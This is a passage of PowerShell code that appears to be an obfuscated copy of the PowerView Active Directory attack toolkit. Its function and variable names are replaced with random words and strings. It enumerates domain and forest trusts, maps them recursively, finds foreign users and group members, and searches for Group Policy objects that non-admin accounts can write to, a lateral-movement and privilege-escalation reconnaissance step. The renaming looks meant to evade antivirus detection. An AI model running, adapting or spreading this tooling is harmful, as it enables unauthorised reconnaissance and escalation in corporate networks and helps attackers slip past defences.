            Write-Verbose "[interrogatory] Using threading with threads: $bCPdUwesQHczYxi"


            $kWZJZEzyPFVetra = @{
                'GroupName' = $T9tockrmJu9UTGT
                'Method' = $hcDrBLy9ZyM9IkS
                'TokenHandle' = $wFitNRlTdxnBQoR
            }


            overhanging -cNTDaoDBIWkDu9I $plcGtRUbnHLQSQg -xxcoHOOdC9XDRbN $ErAMHSSYDKfA9ql -Xz99HsFbkRJSMQr $kWZJZEzyPFVetra -bCPdUwesQHczYxi $bCPdUwesQHczYxi
        }
    }

    END {
        if ($wFitNRlTdxnBQoR) {
            volubility -waC9KrLWsegTDKV $wFitNRlTdxnBQoR
        }
    }
}








function cheerlessly {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,

        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RmrzVOkRggEzAyC,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $wDpWXLYTGZrAWN9,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $KZiNDyuCPTYnSy9,

        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Alias('ReturnOne')]
        [Switch]
        $Fdx99xLobbqBPcQ,

        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $hQNzEi999wzpOz9 = @{
            [uint32]'0x00000001' = 'NON_TRANSITIVE'
            [uint32]'0x00000002' = 'UPLEVEL_ONLY'
            [uint32]'0x00000004' = 'FILTER_SIDS'
            [uint32]'0x00000008' = 'FOREST_TRANSITIVE'
            [uint32]'0x00000010' = 'CROSS_ORGANIZATION'
            [uint32]'0x00000020' = 'WITHIN_FOREST'
            [uint32]'0x00000040' = 'TREAT_AS_EXTERNAL'
            [uint32]'0x00000080' = 'TRUST_USES_RC4_ENCRYPTION'
            [uint32]'0x00000100' = 'TRUST_USES_AES_KEYS'
            [uint32]'0x00000200' = 'CROSS_ORGANIZATION_NO_TGT_DELEGATION'
            [uint32]'0x00000400' = 'PIM_TRUST'
        }

        $v9zuTNfTZyxAIoH = @{}
        if ($PSBoundParameters['Domain']) { $v9zuTNfTZyxAIoH['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['LDAPFilter']) { $v9zuTNfTZyxAIoH['LDAPFilter'] = $RmrzVOkRggEzAyC }
        if ($PSBoundParameters['Properties']) { $v9zuTNfTZyxAIoH['Properties'] = $wDpWXLYTGZrAWN9 }
        if ($PSBoundParameters['SearchBase']) { $v9zuTNfTZyxAIoH['SearchBase'] = $KZiNDyuCPTYnSy9 }
        if ($PSBoundParameters['Server']) { $v9zuTNfTZyxAIoH['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $v9zuTNfTZyxAIoH['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $v9zuTNfTZyxAIoH['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $v9zuTNfTZyxAIoH['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['Tombstone']) { $v9zuTNfTZyxAIoH['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $v9zuTNfTZyxAIoH['Credential'] = $szvFVWkPJummdcf }
    }

    PROCESS {
        if ($PsCmdlet.ParameterSetName -ne 'API') {
            $ZQFKgWWmtlKvNw9 = @{}
            if ($pkMxgDCVHqOym9m -and $pkMxgDCVHqOym9m.Trim() -ne '') {
                $zuIBalw9vXFPZEs = $pkMxgDCVHqOym9m
            }
            else {
                if ($PSBoundParameters['Credential']) {
                    $zuIBalw9vXFPZEs = (forked -szvFVWkPJummdcf $szvFVWkPJummdcf).Name
                }
                else {
                    $zuIBalw9vXFPZEs = (forked).Name
                }
            }
        }
        elseif ($PsCmdlet.ParameterSetName -ne 'NET') {
            if ($pkMxgDCVHqOym9m -and $pkMxgDCVHqOym9m.Trim() -ne '') {
                $zuIBalw9vXFPZEs = $pkMxgDCVHqOym9m
            }
            else {
                $zuIBalw9vXFPZEs = $Env:USERDNSDOMAIN
            }
        }

        if ($PsCmdlet.ParameterSetName -eq 'LDAP') {

            $dzAFo9hWVkhwFEG = cackles @LdapSearcherArguments
            $EnmdCCf9kUifTei = storming @NetSearcherArguments

            if ($dzAFo9hWVkhwFEG) {

                $dzAFo9hWVkhwFEG.Filter = '(objectClass=trustedDomain)'

                if ($PSBoundParameters['FindOne']) { $xSLNEIXByfNTAdG = $dzAFo9hWVkhwFEG.FindOne() }
                else { $xSLNEIXByfNTAdG = $dzAFo9hWVkhwFEG.FindAll() }
                $xSLNEIXByfNTAdG | Where-Object {$_} | ForEach-Object {
                    $Props = $_.Properties
                    $NctwxAEtdlzVigL = New-Object PSObject

                    $lcM999icorUfJDz = @()
                    $lcM999icorUfJDz += $hQNzEi999wzpOz9.Keys | Where-Object { $Props.trustattributes[0] -band $_ } | ForEach-Object { $hQNzEi999wzpOz9[$_] }

                    $NqKIOLTWWy9uxuO = Switch ($Props.trustdirection) {
                        0 { 'Disabled' }
                        1 { 'Inbound' }
                        2 { 'Outbound' }
                        3 { 'Bidirectional' }
                    }

                    $M9spVoXCPlaRiob = Switch ($Props.trusttype) {
                        1 { 'WINDOWS_NON_ACTIVE_DIRECTORY' }
                        2 { 'WINDOWS_ACTIVE_DIRECTORY' }
                        3 { 'MIT' }
                    }

                    $XsrXGCx9OagiGnf = $Props.distinguishedname[0]
                    $oS9sOiGLdaSHJBL = $XsrXGCx9OagiGnf.IndexOf('DC=')
                    if ($oS9sOiGLdaSHJBL) {
                        $zuIBalw9vXFPZEs = $($XsrXGCx9OagiGnf.SubString($oS9sOiGLdaSHJBL)) -replace 'DC=','' -replace ',','.'
                    }
                    else {
                        $zuIBalw9vXFPZEs = ""
                    }

                    $gSJUhCfoftvjdUy = $XsrXGCx9OagiGnf.IndexOf(',CN=System')
                    if ($oS9sOiGLdaSHJBL) {
                        $rT9EZJuWEfY9rVY = $XsrXGCx9OagiGnf.SubString(3, $gSJUhCfoftvjdUy-3)
                    }
                    else {
                        $rT9EZJuWEfY9rVY = ""
                    }

                    $ZAcYYqrKsomqZyv = New-Object Guid @(,$Props.objectguid[0])
                    $GcgzidmbGlwR9ya = (New-Object System.Security.Principal.SecurityIdentifier($Props.securityidentifier[0],0)).Value

                    $NctwxAEtdlzVigL | Add-Member Noteproperty 'SourceName' $zuIBalw9vXFPZEs
                    $NctwxAEtdlzVigL | Add-Member Noteproperty 'TargetName' $Props.name[0]

                    $NctwxAEtdlzVigL | Add-Member Noteproperty 'TrustType' $M9spVoXCPlaRiob
                    $NctwxAEtdlzVigL | Add-Member Noteproperty 'TrustAttributes' $($lcM999icorUfJDz -join ',')
                    $NctwxAEtdlzVigL | Add-Member Noteproperty 'TrustDirection' "$NqKIOLTWWy9uxuO"
                    $NctwxAEtdlzVigL | Add-Member Noteproperty 'WhenCreated' $Props.whencreated[0]
                    $NctwxAEtdlzVigL | Add-Member Noteproperty 'WhenChanged' $Props.whenchanged[0]
                    $NctwxAEtdlzVigL.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.LDAP')
                    $NctwxAEtdlzVigL
                }
                if ($xSLNEIXByfNTAdG) {
                    try { $xSLNEIXByfNTAdG.dispose() }
                    catch {
                        Write-Verbose "[cheerlessly] Error disposing of the Results object: $_"
                    }
                }
                $dzAFo9hWVkhwFEG.dispose()
            }
        }
        elseif ($PsCmdlet.ParameterSetName -eq 'API') {

            if ($PSBoundParameters['Server']) {
                $9dWzuZdgMDBo9TE = $vzBgfX9wPWmbsYZ
            }
            elseif ($pkMxgDCVHqOym9m -and $pkMxgDCVHqOym9m.Trim() -ne '') {
                $9dWzuZdgMDBo9TE = $pkMxgDCVHqOym9m
            }
            else {

                $9dWzuZdgMDBo9TE = $Null
            }


            $aNiBQenLexxQfRW = [IntPtr]::Zero


            $Flags = 63
            $9L999JdWIfIPZwC = 0


            $tP9ZFuQ9oFJi9ZB = $fWPrzxt9Txhddkn::DsEnumerateDomainTrusts($9dWzuZdgMDBo9TE, $Flags, [ref]$aNiBQenLexxQfRW, [ref]$9L999JdWIfIPZwC)


            $IQJFgwWwdtqcTml = $aNiBQenLexxQfRW.ToInt64()


            if (($tP9ZFuQ9oFJi9ZB -eq 0) -and ($IQJFgwWwdtqcTml -gt 0)) {


                $MpkVCERvuMvVtNa = $v9oXhIauHWMpHBt::GetSize()


                for ($i = 0; ($i -lt $9L999JdWIfIPZwC); $i++) {

                    $hsSd9EOnfwKvO9d = New-Object System.Intptr -ArgumentList $IQJFgwWwdtqcTml
                    $Info = $hsSd9EOnfwKvO9d -as $v9oXhIauHWMpHBt

                    $IQJFgwWwdtqcTml = $hsSd9EOnfwKvO9d.ToInt64()
                    $IQJFgwWwdtqcTml += $MpkVCERvuMvVtNa

                    $DDSLoqG9xTVtEQU = ''
                    $tP9ZFuQ9oFJi9ZB = $JRe9dkTvhkNHAuS::ConvertSidToStringSid($Info.DomainSid, [ref]$DDSLoqG9xTVtEQU);$aMxKZmpCKWbTpbk = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                    if ($tP9ZFuQ9oFJi9ZB -eq 0) {
                        Write-Verbose "[cheerlessly] Error: $(([ComponentModel.Win32Exception] $aMxKZmpCKWbTpbk).Message)"
                    }
                    else {
                        $NctwxAEtdlzVigL = New-Object PSObject
                        $NctwxAEtdlzVigL | Add-Member Noteproperty 'SourceName' $zuIBalw9vXFPZEs
                        $NctwxAEtdlzVigL | Add-Member Noteproperty 'TargetName' $Info.DnsDomainName
                        $NctwxAEtdlzVigL | Add-Member Noteproperty 'TargetNetbiosName' $Info.NetbiosDomainName
                        $NctwxAEtdlzVigL | Add-Member Noteproperty 'Flags' $Info.Flags
                        $NctwxAEtdlzVigL | Add-Member Noteproperty 'ParentIndex' $Info.ParentIndex
                        $NctwxAEtdlzVigL | Add-Member Noteproperty 'TrustType' $Info.TrustType
                        $NctwxAEtdlzVigL | Add-Member Noteproperty 'TrustAttributes' $Info.TrustAttributes
                        $NctwxAEtdlzVigL | Add-Member Noteproperty 'TargetSid' $DDSLoqG9xTVtEQU
                        $NctwxAEtdlzVigL | Add-Member Noteproperty 'TargetGuid' $Info.DomainGuid
                        $NctwxAEtdlzVigL.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.API')
                        $NctwxAEtdlzVigL
                    }
                }

                $Null = $fWPrzxt9Txhddkn::NetApiBufferFree($aNiBQenLexxQfRW)
            }
            else {
                Write-Verbose "[cheerlessly] Error: $(([ComponentModel.Win32Exception] $tP9ZFuQ9oFJi9ZB).Message)"
            }
        }
        else {

            $fjOZl9aUAieGsFl = forked @NetSearcherArguments
            if ($fjOZl9aUAieGsFl) {
                $fjOZl9aUAieGsFl.GetAllTrustRelationships() | ForEach-Object {
                    $_.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.NET')
                    $_
                }
            }
        }
    }
}


function varied {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForestTrust.NET')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Ffrzh9iyXWauyhS,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $BiGXvFaDDyo9hDN = @{}
        if ($PSBoundParameters['Forest']) { $BiGXvFaDDyo9hDN['Forest'] = $Ffrzh9iyXWauyhS }
        if ($PSBoundParameters['Credential']) { $BiGXvFaDDyo9hDN['Credential'] = $szvFVWkPJummdcf }

        $aP9CywrTL9ikDEs = cannibalizes @NetForestArguments

        if ($aP9CywrTL9ikDEs) {
            $aP9CywrTL9ikDEs.GetAllTrustRelationships() | ForEach-Object {
                $_.PSObject.TypeNames.Insert(0, 'PowerView.ForestTrust.NET')
                $_
            }
        }
    }
}


function holding {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RmrzVOkRggEzAyC,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $wDpWXLYTGZrAWN9,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $KZiNDyuCPTYnSy9,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $TTVRDqV9wSVspX9,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $tHAcROQOWB9HdRG = @{}
        $tHAcROQOWB9HdRG['LDAPFilter'] = '(memberof=*)'
        if ($PSBoundParameters['Domain']) { $tHAcROQOWB9HdRG['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['Properties']) { $tHAcROQOWB9HdRG['Properties'] = $wDpWXLYTGZrAWN9 }
        if ($PSBoundParameters['SearchBase']) { $tHAcROQOWB9HdRG['SearchBase'] = $KZiNDyuCPTYnSy9 }
        if ($PSBoundParameters['Server']) { $tHAcROQOWB9HdRG['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $tHAcROQOWB9HdRG['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $tHAcROQOWB9HdRG['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $tHAcROQOWB9HdRG['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['SecurityMasks']) { $tHAcROQOWB9HdRG['SecurityMasks'] = $TTVRDqV9wSVspX9 }
        if ($PSBoundParameters['Tombstone']) { $tHAcROQOWB9HdRG['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $tHAcROQOWB9HdRG['Credential'] = $szvFVWkPJummdcf }
        if ($PSBoundParameters['Raw']) { $tHAcROQOWB9HdRG['Raw'] = $Raw }
    }

    PROCESS {
        noshes @SearcherArguments  | ForEach-Object {
            ForEach ($AoxwWtGRyhVaOPP in $_.memberof) {
                $Index = $AoxwWtGRyhVaOPP.IndexOf('DC=')
                if ($Index) {

                    $CaOmjDkUFtCqvby = $($AoxwWtGRyhVaOPP.SubString($Index)) -replace 'DC=','' -replace ',','.'
                    $N9KKC9pAgCnRCPP = $_.distinguishedname
                    $BhhZErb9tkjqY9h = $N9KKC9pAgCnRCPP.IndexOf('DC=')
                    $tXyHSLSY9cxTtcf = $($_.distinguishedname.SubString($BhhZErb9tkjqY9h)) -replace 'DC=','' -replace ',','.'

                    if ($CaOmjDkUFtCqvby -ne $tXyHSLSY9cxTtcf) {

                        $T9tockrmJu9UTGT = $AoxwWtGRyhVaOPP.Split(',')[0].split('=')[1]
                        $OpidZ9WFVNRq9pp = New-Object PSObject
                        $OpidZ9WFVNRq9pp | Add-Member Noteproperty 'UserDomain' $tXyHSLSY9cxTtcf
                        $OpidZ9WFVNRq9pp | Add-Member Noteproperty 'UserName' $_.samaccountname
                        $OpidZ9WFVNRq9pp | Add-Member Noteproperty 'UserDistinguishedName' $_.distinguishedname
                        $OpidZ9WFVNRq9pp | Add-Member Noteproperty 'GroupDomain' $CaOmjDkUFtCqvby
                        $OpidZ9WFVNRq9pp | Add-Member Noteproperty 'GroupName' $T9tockrmJu9UTGT
                        $OpidZ9WFVNRq9pp | Add-Member Noteproperty 'GroupDistinguishedName' $AoxwWtGRyhVaOPP
                        $OpidZ9WFVNRq9pp.PSObject.TypeNames.Insert(0, 'PowerView.ForeignUser')
                        $OpidZ9WFVNRq9pp
                    }
                }
            }
        }
    }
}


function location {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignGroupMember')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RmrzVOkRggEzAyC,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $wDpWXLYTGZrAWN9,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $KZiNDyuCPTYnSy9,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $TTVRDqV9wSVspX9,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $tHAcROQOWB9HdRG = @{}
        $tHAcROQOWB9HdRG['LDAPFilter'] = '(member=*)'
        if ($PSBoundParameters['Domain']) { $tHAcROQOWB9HdRG['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['Properties']) { $tHAcROQOWB9HdRG['Properties'] = $wDpWXLYTGZrAWN9 }
        if ($PSBoundParameters['SearchBase']) { $tHAcROQOWB9HdRG['SearchBase'] = $KZiNDyuCPTYnSy9 }
        if ($PSBoundParameters['Server']) { $tHAcROQOWB9HdRG['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $tHAcROQOWB9HdRG['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $tHAcROQOWB9HdRG['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $tHAcROQOWB9HdRG['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['SecurityMasks']) { $tHAcROQOWB9HdRG['SecurityMasks'] = $TTVRDqV9wSVspX9 }
        if ($PSBoundParameters['Tombstone']) { $tHAcROQOWB9HdRG['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $tHAcROQOWB9HdRG['Credential'] = $szvFVWkPJummdcf }
        if ($PSBoundParameters['Raw']) { $tHAcROQOWB9HdRG['Raw'] = $Raw }
    }

    PROCESS {

        $TSV9BKSRMVXiRHH = @('Users', 'Domain Users', 'Guests')

        offenses @SearcherArguments | Where-Object { $TSV9BKSRMVXiRHH -notcontains $_.samaccountname } | ForEach-Object {
            $T9tockrmJu9UTGT = $_.samAccountName
            $xWpjHQZRBk9WJlP = $_.distinguishedname
            $CaOmjDkUFtCqvby = $xWpjHQZRBk9WJlP.SubString($xWpjHQZRBk9WJlP.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'

            $_.member | ForEach-Object {


                $CXxiKTNyvIENfyI = $_.SubString($_.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                if (($_ -match 'CN=S-1-5-21.*-.*') -or ($CaOmjDkUFtCqvby -ne $CXxiKTNyvIENfyI)) {
                    $GBudnINBvmIoYyL = $_
                    $tzEgjS9u99dzkeq = $_.Split(',')[0].split('=')[1]

                    $hWtSdFtwAoa9jXb = New-Object PSObject
                    $hWtSdFtwAoa9jXb | Add-Member Noteproperty 'GroupDomain' $CaOmjDkUFtCqvby
                    $hWtSdFtwAoa9jXb | Add-Member Noteproperty 'GroupName' $T9tockrmJu9UTGT
                    $hWtSdFtwAoa9jXb | Add-Member Noteproperty 'GroupDistinguishedName' $xWpjHQZRBk9WJlP
                    $hWtSdFtwAoa9jXb | Add-Member Noteproperty 'MemberDomain' $CXxiKTNyvIENfyI
                    $hWtSdFtwAoa9jXb | Add-Member Noteproperty 'MemberName' $tzEgjS9u99dzkeq
                    $hWtSdFtwAoa9jXb | Add-Member Noteproperty 'MemberDistinguishedName' $GBudnINBvmIoYyL
                    $hWtSdFtwAoa9jXb.PSObject.TypeNames.Insert(0, 'PowerView.ForeignGroupMember')
                    $hWtSdFtwAoa9jXb
                }
            }
        }
    }
}


function substitution {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,

        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RmrzVOkRggEzAyC,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $wDpWXLYTGZrAWN9,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $KZiNDyuCPTYnSy9,

        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )


    $dfhbcIAptKcpZqS = @{}


    $fKHQbkQfiLgwQzg = New-Object System.Collections.Stack

    $Rh9dwgtSRoueweH = @{}
    if ($PSBoundParameters['API']) { $Rh9dwgtSRoueweH['API'] = $API }
    if ($PSBoundParameters['NET']) { $Rh9dwgtSRoueweH['NET'] = $NET }
    if ($PSBoundParameters['LDAPFilter']) { $Rh9dwgtSRoueweH['LDAPFilter'] = $RmrzVOkRggEzAyC }
    if ($PSBoundParameters['Properties']) { $Rh9dwgtSRoueweH['Properties'] = $wDpWXLYTGZrAWN9 }
    if ($PSBoundParameters['SearchBase']) { $Rh9dwgtSRoueweH['SearchBase'] = $KZiNDyuCPTYnSy9 }
    if ($PSBoundParameters['Server']) { $Rh9dwgtSRoueweH['Server'] = $vzBgfX9wPWmbsYZ }
    if ($PSBoundParameters['SearchScope']) { $Rh9dwgtSRoueweH['SearchScope'] = $HWlMnJozs9zEkRJ }
    if ($PSBoundParameters['ResultPageSize']) { $Rh9dwgtSRoueweH['ResultPageSize'] = $hHyMPLAr9azKKcQ }
    if ($PSBoundParameters['ServerTimeLimit']) { $Rh9dwgtSRoueweH['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
    if ($PSBoundParameters['Tombstone']) { $Rh9dwgtSRoueweH['Tombstone'] = $gPSKVqwcbkEyaoZ }
    if ($PSBoundParameters['Credential']) { $Rh9dwgtSRoueweH['Credential'] = $szvFVWkPJummdcf }


    if ($PSBoundParameters['Credential']) {
        $wAxKsnszPXCjPdN = (forked -szvFVWkPJummdcf $szvFVWkPJummdcf).Name
    }
    else {
        $wAxKsnszPXCjPdN = (forked).Name
    }
    $fKHQbkQfiLgwQzg.Push($wAxKsnszPXCjPdN)

    while($fKHQbkQfiLgwQzg.Count -ne 0) {

        $pkMxgDCVHqOym9m = $fKHQbkQfiLgwQzg.Pop()


        if ($pkMxgDCVHqOym9m -and ($pkMxgDCVHqOym9m.Trim() -ne '') -and (-not $dfhbcIAptKcpZqS.ContainsKey($pkMxgDCVHqOym9m))) {

            Write-Verbose "[substitution] Enumerating trusts for domain: '$pkMxgDCVHqOym9m'"


            $Null = $dfhbcIAptKcpZqS.Add($pkMxgDCVHqOym9m, '')

            try {

                $Rh9dwgtSRoueweH['Domain'] = $pkMxgDCVHqOym9m
                $uKxCsAurhOyCcYy = cheerlessly @DomainTrustArguments

                if ($uKxCsAurhOyCcYy -isnot [System.Array]) {
                    $uKxCsAurhOyCcYy = @($uKxCsAurhOyCcYy)
                }


                if ($PsCmdlet.ParameterSetName -eq 'NET') {
                    $NBFYSlQglsYGxZE = @{}
                    if ($PSBoundParameters['Forest']) { $NBFYSlQglsYGxZE['Forest'] = $Ffrzh9iyXWauyhS }
                    if ($PSBoundParameters['Credential']) { $NBFYSlQglsYGxZE['Credential'] = $szvFVWkPJummdcf }
                    $uKxCsAurhOyCcYy += varied @ForestTrustArguments
                }

                if ($uKxCsAurhOyCcYy) {
                    if ($uKxCsAurhOyCcYy -isnot [System.Array]) {
                        $uKxCsAurhOyCcYy = @($uKxCsAurhOyCcYy)
                    }


                    ForEach ($Trust in $uKxCsAurhOyCcYy) {
                        if ($Trust.SourceName -and $Trust.TargetName) {

                            $Null = $fKHQbkQfiLgwQzg.Push($Trust.TargetName)
                            $Trust
                        }
                    }
                }
            }
            catch {
                Write-Verbose "[substitution] Error: $_"
            }
        }
    }
}


function quotient {


    [CmdletBinding()]
    Param (
        [String]
        $u9d9WHZXI9wtSod = '*',

        [ValidateRange(1,10000)] 
        [Int]
        $ctYTWHxvFfmMRou = 200
    )

    $IyVXkhZVub9FUvA = @('SYSTEM','Domain Admins','Enterprise Admins')

    $Ffrzh9iyXWauyhS = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    $nQqSZR9bjfVts9i = @($Ffrzh9iyXWauyhS.Domains)
    $fKHQbkQfiLgwQzg = $nQqSZR9bjfVts9i | foreach { $_.GetDirectoryEntry() }
    foreach ($pkMxgDCVHqOym9m in $fKHQbkQfiLgwQzg) {
        $9QyouHvxMZKCIKN = "(&(objectCategory=groupPolicyContainer)(displayname=$u9d9WHZXI9wtSod))"
        $NenCdilaMvVXuzG = New-Object System.DirectoryServices.DirectorySearcher
        $NenCdilaMvVXuzG.SearchRoot = $pkMxgDCVHqOym9m
        $NenCdilaMvVXuzG.Filter = $9QyouHvxMZKCIKN
        $NenCdilaMvVXuzG.PageSize = $ctYTWHxvFfmMRou
        $NenCdilaMvVXuzG.SearchScope = "Subtree"
        $NVGoRqVIJcXXbqA = $NenCdilaMvVXuzG.FindAll()
        foreach ($gpo in $NVGoRqVIJcXXbqA){
            $ACL = ([ADSI]$gpo.path).ObjectSecurity.Access | ? {$_.ActiveDirectoryRights -match "Write" -and $_.AccessControlType -eq "Allow" -and  $IyVXkhZVub9FUvA -notcontains $_.IdentityReference.toString().split("\")[1] -and $_.IdentityReference -ne "CREATOR OWNER"}
        if ($ACL -ne $null){
            $NwffJOfUHJC9y9O = New-Object psobject
            $NwffJOfUHJC9y9O | Add-Member Noteproperty 'ADSPath' $gpo.Properties.adspath
